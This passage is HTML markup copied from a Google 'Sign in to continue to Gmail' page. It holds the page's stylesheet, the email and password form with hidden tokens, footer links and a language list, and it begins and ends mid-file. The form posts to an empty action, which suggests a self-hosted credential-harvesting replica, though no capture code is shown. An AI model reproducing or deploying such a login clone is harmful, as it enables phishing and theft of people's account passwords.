            -o-transform: translateZ(0);
            transform: translateZ(0);
            position: absolute;
            width: 100%;
        }
        .form-panel.first {
            z-index: 2;
        }
        .form-panel.second {
            z-index: 1;
        }
        .shift-form .form-panel.first {
            z-index: 1;
        }
        .shift-form .form-panel.second {
            z-index: 2;
        }
        .hide-form.slide-out {
            display: none;
        }
        .hide-form.slide-in {
            display: none;
        }
        .slide-in,
        .slide-out {
            display: block;
            -webkit-transition-property: -webkit-transform, opacity;
            -moz-transition-property: -moz-transform, opacity;
            -ms-transition-property: -ms-transform, opacity;
            -o-transition-property: -o-transform, opacity;
            transition-property: transform, opacity;
            -webkit-transition-duration: 0.1s;
            -moz-transition-duration: 0.1s;
            -ms-transition-duration: 0.1s;
            -o-transition-duration: 0.1s;
            transition-duration: 0.1s;
            -webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
            -moz-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
            -ms-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
            -o-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
        }
        .slide-out {
            -webkit-transform: translate3d(0, 0, 0);
            -moz-transform: translate3d(0, 0, 0);
            -ms-transform: translate3d(0, 0, 0);
            -o-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0);
        }
        .shift-form .slide-out {
            opacity: 0;
            -webkit-transform: translate3d(-120%, 0, 0);
            -moz-transform: translate3d(-120%, 0, 0);
            -ms-transform: translate3d(-120%, 0, 0);
            -o-transform: translate3d(-120%, 0, 0);
            transform: translate3d(-120%, 0, 0);
        }
        .slide-in {
            -webkit-transform: translate3d(120%, 0, 0);
            -moz-transform: translate3d(120%, 0, 0);
            -ms-transform: translate3d(120%, 0, 0);
            -o-transform: translate3d(120%, 0, 0);
            transform: translate3d(120%, 0, 0);
        }
        .shift-form .slide-in {
            opacity: 1;
            -webkit-transform: translate3d(0, 0, 0);
            -moz-transform: translate3d(0, 0, 0);
            -ms-transform: translate3d(0, 0, 0);
            -o-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0);
        }
        .error-msg {
            -webkit-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
            -moz-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
            -ms-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
            -o-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
            transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
            height: auto;
            max-height: 0;
            opacity: 0;
        }
        .has-error .error-msg {
            max-height: 3.5em;
            margin-top: 10px;
            margin-bottom: 10px;
            opacity: 1;
            visibility: visible;
        }
        .back-arrow {
            position: absolute;
            top: 37px;
            width: 24px;
            height: 24px;
            display: none;
            cursor: pointer;
        }
        .back-arrow {
            border-style: none;
        }
        .shift-form.back-arrow {
            display: block;
        }
        #link-signup {
            text-align: center;
            font-size: 14px;
        }
        .shift-form #link-signup{
            display: none;
        }
        #link-signin-different {
            display: none;
            text-align: center;
            font-size: 14px;
        }
        .shift-form #link-signin-different {
            display: block;
        }
        .signin-card #profile-name {
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            margin: 0;
            min-height: 1em;
        }
        .signin-card.no-name #profile-name {
            display: none;
        }
        .signin-card.no-name #email-display {
            line-height: initial;
            margin-bottom: 16px;
        }
        .signin-card #email-display {
            display: block;
            padding: 0px 8px;
            color: rgb(64, 64, 64);
            line-height: 2;
            margin-bottom: 10px;
            font-size: 14px;
            text-align: center;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }
        .signin-card #Email {
            margin-top: 16px;
        }
        .need-help {
            float: right;
            text-align: right;
        }
        .form-panel {
            width: 274px;
        }
        #gaia_firstform {
            z-index: 2;
        }
        .signin-card {
            position: relative;
            overflow: hidden;
        }
        .signin-card #profile-name {
            color: #000;
        }
        .circle-mask {
            display: block;
            height: 96px;
            width: 96px;
            overflow: hidden;
            border-radius: 50%;
            margin-left: auto;
            margin-right: auto;
            z-index: 100;
            margin-bottom: 10px;
            background-size: 96px;
            background-repeat: no-repeat;
            background-image: url(https://ssl.gstatic.com/accounts/ui/avatar_2x.png);
            -webkit-transition: opacity 0.075s;
            -moz-transition: opacity 0.075s;
            -ms-transition: opacity 0.075s;
            -o-transition: opacity 0.075s;
            transition: opacity 0.075s;
        }
        .circle {
            -webkit-transition-property: -webkit-transform;
            -moz-transition-property: -moz-transform;
            -ms-transition-property: -ms-transform;
            -o-transition-property: -o-transform;
            transition-property: transform;
            -webkit-transition-timing-function: cubic-bezier(.645,.045,.355,1);
            -moz-transition-timing-function: cubic-bezier(.645,.045,.355,1);
            -ms-transition-timing-function: cubic-bezier(.645,.045,.355,1);
            -o-transition-timing-function: cubic-bezier(.645,.045,.355,1);
            transition-timing-function: cubic-bezier(.645,.045,.355,1);
        }
        .circle {
            position: absolute;
            z-index: 101;
            height: 96px;
            width: 96px;
            border-radius: 50%;
            opacity: 0.99;
            overflow: hidden;
            background-repeat: no-repeat;
            background-position: center center;
        }
        .main {
            overflow: hidden;
        }
        .card-mask-wrap {
            position: relative;
            width: 360px;
            margin: 0 auto;
            z-index: 1;
        }
        .dasher-tooltip {
            position: absolute;
            left: 50%;
            margin-left: 150px;
        }
        .dasher-tooltip .tooltip-pointer {
            margin-top: 15px;
        }
        .dasher-tooltip p {
            margin-top: 0;
        }
        .dasher-tooltip p span {
            display: block;
        }
        .signin-card {
            height: 500px;
        }
        .card-mask-wrap {
            -webkit-transition: transform 0.5s;
            -moz-transition: transform 0.5s;
            -ms-transition: transform 0.5s;
            -o-transition: transform 0.5s;
            transition: transform 0.5s;
            -webkit-transform: translate3d(0,
            -263px
            , 0);
            -moz-transform: translate3d(0,
            -263px
            , 0);
            -ms-transform: translate3d(0,
            -263px
            , 0);
            -o-transform: translate3d(0,
            -263px
            , 0);
            transform: translate3d(0,
            -263px
            , 0);
        ;
        }
        .card-mask-wrap.has-captcha {
            -webkit-transform: translate3d(0,
            -93px
            , 0);
            -moz-transform: translate3d(0,
            -93px
            , 0);
            -ms-transform: translate3d(0,
            -93px
            , 0);
            -o-transform: translate3d(0,
            -93px
            , 0);
            transform: translate3d(0,
            -93px
            , 0);
        ;
        }
        .card-mask-wrap.has-error {
            -webkit-transform: translate3d(0,
            -223px
            , 0);
            -moz-transform: translate3d(0,
            -223px
            , 0);
            -ms-transform: translate3d(0,
            -223px
            , 0);
            -o-transform: translate3d(0,
            -223px
            , 0);
            transform: translate3d(0,
            -223px
            , 0);
        ;
        }
        .card-mask-wrap.has-captcha.has-error {
            -webkit-transform: translate3d(0,
            -53px
            , 0);
            -moz-transform: translate3d(0,
            -53px
            , 0);
            -ms-transform: translate3d(0,
            -53px
            , 0);
            -o-transform: translate3d(0,
            -53px
            , 0);
            transform: translate3d(0,
            -53px
            , 0);
        ;
        }
        .shift-form.card-mask-wrap {
            -webkit-transform: translate3d(0,
            -222px
            , 0);
            -moz-transform: translate3d(0,
            -222px
            , 0);
            -ms-transform: translate3d(0,
            -222px
            , 0);
            -o-transform: translate3d(0,
            -222px
            , 0);
            transform: translate3d(0,
            -222px
            , 0);
        ;
        }
        .has-error.shift-form.card-mask-wrap {
            -webkit-transform: translate3d(0,
            -182px
            , 0);
            -moz-transform: translate3d(0,
            -182px
            , 0);
            -ms-transform: translate3d(0,
            -182px
            , 0);
            -o-transform: translate3d(0,
            -182px
            , 0);
            transform: translate3d(0,
            -182px
            , 0);
        ;
        }
        .shift-form.card-mask-wrap.no-name {
            -webkit-transform: translate3d(0,
            -242px
            , 0);
            -moz-transform: translate3d(0,
            -242px
            , 0);
            -ms-transform: translate3d(0,
            -242px
            , 0);
            -o-transform: translate3d(0,
            -242px
            , 0);
            transform: translate3d(0,
            -242px
            , 0);
        ;
        }
        .has-error.shift-form.card-mask-wrap.no-name {
            -webkit-transform: translate3d(0,
            -202px
            , 0);
            -moz-transform: translate3d(0,
            -202px
            , 0);
            -ms-transform: translate3d(0,
            -202px
            , 0);
            -o-transform: translate3d(0,
            -202px
            , 0);
            transform: translate3d(0,
            -202px
            , 0);
        ;
        }
        .has-captcha.shift-form.card-mask-wrap {
            -webkit-transform: translate3d(0,
            -52px
            , 0);
            -moz-transform: translate3d(0,
            -52px
            , 0);
            -ms-transform: translate3d(0,
            -52px
            , 0);
            -o-transform: translate3d(0,
            -52px
            , 0);
            transform: translate3d(0,
            -52px
            , 0);
        ;
        }
        .has-captcha.shift-form.card-mask-wrap.no-name {
            -webkit-transform: translate3d(0,
            -72px
            , 0);
            -moz-transform: translate3d(0,
            -72px
            , 0);
            -ms-transform: translate3d(0,
            -72px
            , 0);
            -o-transform: translate3d(0,
            -72px
            , 0);
            transform: translate3d(0,
            -72px
            , 0);
        ;
        }
        .has-captcha.shift-form.card-mask-wrap.has-error {
            -webkit-transform: translate3d(0,
            -12px
            , 0);
            -moz-transform: translate3d(0,
            -12px
            , 0);
            -ms-transform: translate3d(0,
            -12px
            , 0);
            -o-transform: translate3d(0,
            -12px
            , 0);
            transform: translate3d(0,
            -12px
            , 0);
        ;
        }
        .has-captcha.shift-form.card-mask-wrap.has-error.no-name {
            -webkit-transform: translate3d(0,
            -32px
            , 0);
            -moz-transform: translate3d(0,
            -32px
            , 0);
            -ms-transform: translate3d(0,
            -32px
            , 0);
            -o-transform: translate3d(0,
            -32px
            , 0);
            transform: translate3d(0,
            -32px
            , 0);
        ;
        }
        .main-content {
            height: 450px;
        ;
        }
        .main-content.has-captcha {
            height: 620px;
        ;
        }
        .main-content.has-error {
            height: 490px;
        ;
        }
        .main-content.has-captcha.has-error {
            height: 660px;
        ;
        }
        .shift-form.main-content {
            height: 491px;
        ;
        }
        .has-error.shift-form.main-content {
            height: 531px;
        ;
        }
        .shift-form.main-content.no-name {
            height: 471px;
        ;
        }
        .has-error.shift-form.main-content.no-name {
            height: 511px;
        ;
        }
        .has-captcha.shift-form.main-content {
            height: 661px;
        ;
        }
        .has-captcha.shift-form.main-content.no-name {
            height: 641px;
        ;
        }
        .has-captcha.shift-form.main-content.has-error {
            height: 701px;
        ;
        }
        .has-captcha.shift-form.main-content.has-error.no-name {
            height: 681px;
        ;
        }
        .card-mask {
            background-color: #fff;
            background-position: 50% 0;
            background-repeat: no-repeat;
            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAWgAAAAGCAIAAABhDpMcAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gkeFxks6YflLAAAAKlJREFUWMPt2CEShDAMheGmMCFV1MH9z8MtarC4QKfNiuwwOyxHeJ9r6iJ+ETKz3vu+7/M8D8MQAADetNaO41jXNcYYfUREpZRaK7YDAP9qraUUIvLn6NVg5t77tm2qamZYEwDciEhElmVhZm/H6B8ppZxzCOE8T4QDAB7hmKYp55xS+k48E601VVXV67oQDgB4hIOZRURE/BJKv5kwM1QDAF7bcR84Qggf4ShHovU/ogcAAAAASUVORK5CYII=);
            min-height: 300px;
        }
        .card {
            margin-bottom: 0;
        }
        .one-google {
            padding-top: 27px;
        }
        #canvas {
            -webkit-transition: opacity 0.075s;
            -moz-transition: opacity 0.075s;
            -ms-transition: opacity 0.075s;
            -o-transition: opacity 0.075s;
            transition: opacity 0.075s;
            opacity: 0.01;
        }
        .shift-form #canvas {
            opacity: 0.99;
        }
        .label {
            color: #404040;
        }
        #account-chooser-link {
            -webkit-transition: opacity 0.3s;
            -moz-transition: opacity 0.3s;
            -ms-transition: opacity 0.3s;
            -o-transition: opacity 0.3s;
            transition: opacity 0.3s;
        }
        .input-wrapper {
            position: relative;
        }
        .google-footer-bar {
            z-index: 2;
        }
    </style>
    <style media="screen and (max-width: 580px)">
        .back-arrow {
            top: 17px;
        }
        .circle-mask {
            height: 72px;
            width: 72px;
            background-size: 72px;
        }
        .circle {
            height: 72px;
            width: 72px;
        }
        #canvas {
            height: 72px;
            width: 72px;
        }
        .form-panel {
            width: 256px;
        }
        .card-mask-wrap {
            width: 300px;
        }
        .card-mask {
            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAS4AAAAGCAIAAADyquT7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNS4xIFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RDcyMjMyQ0NFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RDcyMjMyQ0RFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpENzIyMzJDQUU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpENzIyMzJDQkU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqGCc+MAAACnSURBVHja7Ng7DoQgFIXhYTAKFXS6//W4CxtaOh4B5sQ7mcwGpDpfpdjd5M9V1Rij9x5CcM5prV9ENEtrLcZ4HMcb5EgpdV1XrZXTIZoDuSE6pCe3i3S4rit243meKSXsSY6J6FGIzhiz7zvSkxoXeWCt9d7jIufMFIkmpLhtG6JDet8TCQ/vrOlWSmGKRBNSxD40N/lHo/7DGzeOiWhOjb8PRfgIMAAaYEeit6tkKwAAAABJRU5ErkJggg==);
        }
        .card-mask-wrap {
            -webkit-transform: translate3d(0,
            -288px
            , 0);
            -moz-transform: translate3d(0,
            -288px
            , 0);
            -ms-transform: translate3d(0,
            -288px
            , 0);
            -o-transform: translate3d(0,
            -288px
            , 0);
            transform: translate3d(0,
            -288px
            , 0);
        ;
        }
        .card-mask-wrap.has-captcha {
            -webkit-transform: translate3d(0,
            -118px
            , 0);
            -moz-transform: translate3d(0,
            -118px
            , 0);
            -ms-transform: translate3d(0,
            -118px
            , 0);
            -o-transform: translate3d(0,
            -118px
            , 0);
            transform: translate3d(0,
            -118px
            , 0);
        ;
        }
        .card-mask-wrap.has-error {
            -webkit-transform: translate3d(0,
            -248px
            , 0);
            -moz-transform: translate3d(0,
            -248px
            , 0);
            -ms-transform: translate3d(0,
            -248px
            , 0);
            -o-transform: translate3d(0,
            -248px
            , 0);
            transform: translate3d(0,
            -248px
            , 0);
        ;
        }
        .card-mask-wrap.has-captcha.has-error {
            -webkit-transform: translate3d(0,
            -78px
            , 0);
            -moz-transform: translate3d(0,
            -78px
            , 0);
            -ms-transform: translate3d(0,
            -78px
            , 0);
            -o-transform: translate3d(0,
            -78px
            , 0);
            transform: translate3d(0,
            -78px
            , 0);
        ;
        }
        .shift-form.card-mask-wrap {
            -webkit-transform: translate3d(0,
            -247px
            , 0);
            -moz-transform: translate3d(0,
            -247px
            , 0);
            -ms-transform: translate3d(0,
            -247px
            , 0);
            -o-transform: translate3d(0,
            -247px
            , 0);
            transform: translate3d(0,
            -247px
            , 0);
        ;
        }
        .has-error.shift-form.card-mask-wrap {
            -webkit-transform: translate3d(0,
            -207px
            , 0);
            -moz-transform: translate3d(0,
            -207px
            , 0);
            -ms-transform: translate3d(0,
            -207px
            , 0);
            -o-transform: translate3d(0,
            -207px
            , 0);
            transform: translate3d(0,
            -207px
            , 0);
        ;
        }
        .shift-form.card-mask-wrap.no-name {
            -webkit-transform: translate3d(0,
            -267px
            , 0);
            -moz-transform: translate3d(0,
            -267px
            , 0);
            -ms-transform: translate3d(0,
            -267px
            , 0);
            -o-transform: translate3d(0,
            -267px
            , 0);
            transform: translate3d(0,
            -267px
            , 0);
        ;
        }
        .has-error.shift-form.card-mask-wrap.no-name {
            -webkit-transform: translate3d(0,
            -227px
            , 0);
            -moz-transform: translate3d(0,
            -227px
            , 0);
            -ms-transform: translate3d(0,
            -227px
            , 0);
            -o-transform: translate3d(0,
            -227px
            , 0);
            transform: translate3d(0,
            -227px
            , 0);
        ;
        }
        .has-captcha.shift-form.card-mask-wrap {
            -webkit-transform: translate3d(0,
            -77px
            , 0);
            -moz-transform: translate3d(0,
            -77px
            , 0);
            -ms-transform: translate3d(0,
            -77px
            , 0);
            -o-transform: translate3d(0,
            -77px
            , 0);
            transform: translate3d(0,
            -77px
            , 0);
        ;
        }
        .has-captcha.shift-form.card-mask-wrap.no-name {
            -webkit-transform: translate3d(0,
            -97px
            , 0);
            -moz-transform: translate3d(0,
            -97px
            , 0);
            -ms-transform: translate3d(0,
            -97px
            , 0);
            -o-transform: translate3d(0,
            -97px
            , 0);
            transform: translate3d(0,
            -97px
            , 0);
        ;
        }
        .has-captcha.shift-form.card-mask-wrap.has-error {
            -webkit-transform: translate3d(0,
            -37px
            , 0);
            -moz-transform: translate3d(0,
            -37px
            , 0);
            -ms-transform: translate3d(0,
            -37px
            , 0);
            -o-transform: translate3d(0,
            -37px
            , 0);
            transform: translate3d(0,
            -37px
            , 0);
        ;
        }
        .has-captcha.shift-form.card-mask-wrap.has-error.no-name {
            -webkit-transform: translate3d(0,
            -57px
            , 0);
            -moz-transform: translate3d(0,
            -57px
            , 0);
            -ms-transform: translate3d(0,
            -57px
            , 0);
            -o-transform: translate3d(0,
            -57px
            , 0);
            transform: translate3d(0,
            -57px
            , 0);
        ;
        }
        .main-content {
            height: 350px;
        ;
        }
        .main-content.has-captcha {
            height: 520px;
        ;
        }
        .main-content.has-error {
            height: 390px;
        ;
        }
        .main-content.has-captcha.has-error {
            height: 560px;
        ;
        }
        .shift-form.main-content {
            height: 391px;
        ;
        }
        .has-error.shift-form.main-content {
            height: 431px;
        ;
        }
        .shift-form.main-content.no-name {
            height: 371px;
        ;
        }
        .has-error.shift-form.main-content.no-name {
            height: 411px;
        ;
        }
        .has-captcha.shift-form.main-content {
            height: 561px;
        ;
        }
        .has-captcha.shift-form.main-content.no-name {
            height: 541px;
        ;
        }
        .has-captcha.shift-form.main-content.has-error {
            height: 601px;
        ;
        }
        .has-captcha.shift-form.main-content.has-error.no-name {
            height: 581px;
        ;
        }
        .signin-card {
            width: 256px;
        }
        .signin-card #EmailFirst {
            margin-top: 15px;
        }
        .one-google {
            padding-top: 22px;
        }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="google-header-bar  centered">
        <div class="header content clearfix">
            <div class="logo logo-w" aria-label="Google"></div>
        </div>
    </div>
    <div class="main content clearfix">
        <div class="banner">
            <h1>
                One account. All of Google.
            </h1>
            <h2 class="hidden-small">
                Sign in to continue to Gmail
            </h2>
        </div>
        <div class="main-content


    no-name



">
            <div class="card signin-card

    pre-shift



   no-name">
                <div id="cc_iframe_parent"></div>
                <div class="circle-mask" style="


      ">
                    <canvas id="canvas" class="circle" width="96" height="96"></canvas>
                </div>
                <form novalidate method="post" action="" id="gaia_loginform">
                    <input name="Page" type="hidden" value="PasswordSeparationSignIn">
                    <input type="hidden" name="GALX" value="UZanTNzSrQ8">
                    <input type="hidden" name="gxf" value="AFoagUVowq8Lmjs8KZt-S8a0RTlI-8bVpw:1480803581669">
                    <input type="hidden" name="continue" value="https://mail.google.com/mail/">
                    <input type="hidden" name="service" value="mail">
                    <input id="profile-information" name="ProfileInformation" type="hidden" value="">
                    <input id="session-state" name="SessionState" type="hidden" value="">
                    <input type="hidden" id="_utf8" name="_utf8" value="&#9731;"/>
                    <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
                    <input type="hidden" id="pstMsg" name="pstMsg" value="0">
                    <input type="hidden" id="checkConnection" name="checkConnection" value="">
                    <input type="hidden" id="checkedDomains" name="checkedDomains"
                           value="youtube">
                    <div class="form-panel first valid" id="gaia_firstform">
                        <div class="slide-out ">
                            <div class="input-wrapper focused">
                                <div id="identifier-shown">
                                    <div>
                                        <label class="hidden-label" for="Email">
                                            Enter your email</label>
                                        <input id="Email" type="email" value="" spellcheck="false"
                                               name="Email"

                                               placeholder="Enter your email"



                                               autofocus>
                                        <input id="Passwd-hidden" type="password" spellcheck="false" class="hidden">
                                    </div>
                                </div>
                                <span role="alert" class="error-msg" id="errormsg_0_Email"></span>
                            </div>
                            <div style="display: none" id="identifier-captcha">
                                <input type="hidden" name="identifiertoken" id="identifier-token" value="">
                                <input type="hidden" name="identifiertoken_audio" id="identifier-token-audio">
                                <div class="audio-box">
                                    <div id="playIdentifierAudio"></div>
                                </div>
                                <div id="captcha-box" class="captcha-box">
                                    <div id="captcha-img" class="captcha-img" data-alt-text="Visual verification">
                                    </div>
                                    <span class="captcha-msg">
  Letters are not case-sensitive
  </span>
                                </div>
                                <label for="identifier-captcha-input"

                                       class="hidden-label"
                                ></label>
                                <input type="text"
                                       id="identifier-captcha-input"
                                       name="identifier-captcha-input"
                                       class="captcha"
                                       placeholder="Enter the letters above"
                                       title="Type the characters you see or numbers you hear">
                            </div>
                            <input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Next">
                            <a class="need-help"
                               href="https://accounts.google.com/signin/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;hl=en">
                                Find my account
                            </a>
                        </div>
                    </div>
                    <a href="https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail" tabindex="-1">
                        <img id="back-arrow" class="back-arrow " aria-label="Back" tabindex="0" alt="Back"

                             src="https://www.gstatic.com/images/icons/material/system/1x/arrow_back_grey600_24dp.png"

                        >
                    </a>
                    <div class="form-panel second">
                        <div class="slide-in hide-form">
                            <div>
                                <p id="profile-name"></p>
                                <span id="email-display"></span>
                            </div>
                            <div>
                                <div id="password-shown">
                                    <div>
                                        <input id="Email-hidden"  type="email" spellcheck="false" class="hidden" value="" readonly autocomplete="off">
                                        <label class="hidden-label" for="Passwd">Password</label>
                                        <input id="Passwd" name="Passwd" type="password"
                                               placeholder="Password"
                                               class=""

                                        >
                                    </div>
                                </div>
                            </div>
                            <input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
                            <label class="remember">
                                <input id="PersistentCookie" name="PersistentCookie"
                                       type="checkbox" value="yes"
                                       checked="checked">
                                <span>
  Stay signed in
  </span>
                                <div class="bubble-wrap" role="tooltip">
                                    <div class="bubble-pointer"></div>
                                    <div class="bubble">
                                        For your convenience, keep this checked. On shared devices, additional precautions are recommended.
                                        <a href="https://support.google.com/accounts/?p=securesignin&hl=en" target="_blank">Learn more</a>
                                    </div>
                                </div>
                            </label>
                            <input type="hidden" name="rmShown" value="1">
                            <a id="link-forgot-passwd" class="need-help"
                               href="https://accounts.google.com/signin/recovery?hl=en"
                            >
                                Forgot password?
                            </a>
                        </div>
                    </div>
                    <span id="inge" style="display: none" role="alert" class="error-msg">
  Sorry, Google doesn't recognize that email. <a href="https://accounts.google.com/SignUpWithoutGmail?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F">Create an account</a> using that address?
  </span>
                    <span id="timeoutError" style="display: none" role="alert" class="error-msg">
  Something went wrong. Check your connection and try again.
  </span>
                </form>
            </div>
            <div class="card-mask-wrap


     no-name">
                <div class="card-mask">
                    <div class="one-google">
                        <p class="create-account">
  <span id="link-signin-different">
  <a href="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;hl=en&amp;service=mail">
  Sign in with a different account
  </a>
  </span>
                            <span id="link-signup">
  <a href="https://accounts.google.com/SignUp?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F">
  Create account
  </a>
  </span>
                        </p>
                        <p class="tagline">
                            One Google Account for everything Google
                        </p>
                        <div class="logo-strip"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="google-footer-bar">
        <div class="footer content clearfix">
            <ul id="footer-list">
                <li>
                    <a href="https://www.google.com/intl/en/about" target="_blank">
                        About Google
                    </a>
                </li>
                <li>
                    <a href="https://accounts.google.com/TOS?loc=PL&hl=en&privacy=true" target="_blank">
                        Privacy
                    </a>
                </li>
                <li>
                    <a href="https://accounts.google.com/TOS?loc=PL&hl=en" target="_blank">
                        Terms
                    </a>
                </li>
                <li>
                    <a href="http://www.google.com/support/accounts?hl=en" target="_blank">
                        Help
                    </a>
                </li>
            </ul>
            <div id="lang-vis-control" style="display: none">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="//ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af"
  >
  ‪Afrikaans‬
  </option>
  <option value="az"
  >
  ‪azərbaycan dili‬
  </option>
  <option value="ms"
  >
  ‪Bahasa Melayu‬
  </option>
  <option value="ca"
  >
  ‪català‬
  </option>
  <option value="cs"
  >
  ‪Čeština‬
  </option>
  <option value="da"
  >
  ‪Dansk‬
  </option>
  <option value="de"
  >
  ‪Deutsch‬
  </option>
  <option value="et"
  >
  ‪eesti‬
  </option>
  <option value="en-GB"
  >
  ‪English (United Kingdom)‬
  </option>
  <option value="en"

          selected="selected"
  >
  ‪English (United States)‬
  </option>
  <option value="es"
  >
  ‪Español (España)‬
  </option>
  <option value="es-419"
  >
  ‪Español (Latinoamérica)‬
  </option>
  <option value="eu"
  >
  ‪euskara‬
  </option>
  <option value="fil"
  >
  ‪Filipino‬
  </option>
  <option value="fr-CA"
  >
  ‪Français (Canada)‬
  </option>
  <option value="fr"
  >
  ‪Français (France)‬
  </option>
  <option value="gl"
  >
  ‪galego‬
  </option>
  <option value="hr"
  >
  ‪Hrvatski‬
  </option>
  <option value="in"
  >
  ‪Indonesia‬
  </option>
  <option value="zu"
  >
  ‪isiZulu‬
  </option>
  <option value="is"
  >
  ‪íslenska‬
  </option>
  <option value="it"
  >
  ‪Italiano‬
  </option>
  <option value="sw"
  >
  ‪Kiswahili‬
  </option>
  <option value="lv"
  >
  ‪latviešu‬
  </option>
  <option value="lt"
  >
  ‪lietuvių‬
  </option>
  <option value="hu"
  >
  ‪magyar‬
  </option>
  <option value="nl"
  >
  ‪Nederlands‬
  </option>
  <option value="no"
  >
  ‪norsk‬
  </option>
  <option value="pl"
  >
  ‪polski‬
  </option>
  <option value="pt"
  >
  ‪Português (Brasil)‬
  </option>
  <option value="pt-PT"
  >
  ‪português (Portugal)‬
  </option>
  <option value="ro"
  >
  ‪română‬
  </option>
  <option value="sk"
  >
  ‪Slovenčina‬
  </option>
  <option value="sl"
  >
  ‪slovenščina‬
  </option>
  <option value="fi"
  >
  ‪Suomi‬
  </option>
  <option value="sv"
  >
  ‪Svenska‬
  </option>
  <option value="vi"
  >
  ‪Tiếng Việt‬
  </option>
  <option value="tr"
  >
  ‪Türkçe‬
  </option>
  <option value="el"
  >
  ‪Ελληνικά‬
  </option>
  <option value="bg"
  >
  ‪български‬
  </option>
  <option value="mn"
  >
  ‪монгол‬
  </option>
  <option value="ru"
  >
  ‪Русский‬
  </option>
  <option value="sr"
  >
  ‪српски‬
  </option>
  <option value="uk"
  >
  ‪Українська‬
  </option>
  <option value="ka"
  >
  ‪ქართული‬
  </option>
  <option value="hy"
  >
  ‪հայերեն‬
  </option>
  <option value="iw"
  >
  ‫עברית‬‎
  </option>
  <option value="ur"
  >
  ‫اردو‬‎
  </option>
  <option value="ar"
  >
  ‫العربية‬‎
  </option>
  <option value="fa"
  >
  ‫فارسی‬‎
  </option>
  <option value="am"
  >
  ‪አማርኛ‬
  </option>
  <option value="ne"
  >
  ‪नेपाली‬
  </option>
  <option value="mr"
  >
  ‪मराठी‬
  </option>
  <option value="hi"
  >
  ‪हिन्दी‬
  </option>
  <option value="bn"
  >
  ‪বাংলা‬
  </option>
  <option value="gu"
  >
  ‪ગુજરાતી‬
  </option>
  <option value="ta"
  >
  ‪தமிழ்‬
  </option>
  <option value="te"
  >
  ‪తెలుగు‬
  </option>
  <option value="kn"
  >
  ‪ಕನ್ನಡ‬
  </option>
  <option value="ml"
  >
  ‪മലയാളം‬
  </option>
  <option value="si"
  >
  ‪සිංහල‬
  </option>
  <option value="th"
  >
  ‪ไทย‬
  </option>
  <option value="lo"
  >
  ‪ລາວ‬
  </option>
  <option value="my"
  >
  ‪ဗမာ‬
  </option>
  <option value="km"
  >
  ‪ខ្មែរ‬
  </option>
  <option value="ko"
  >
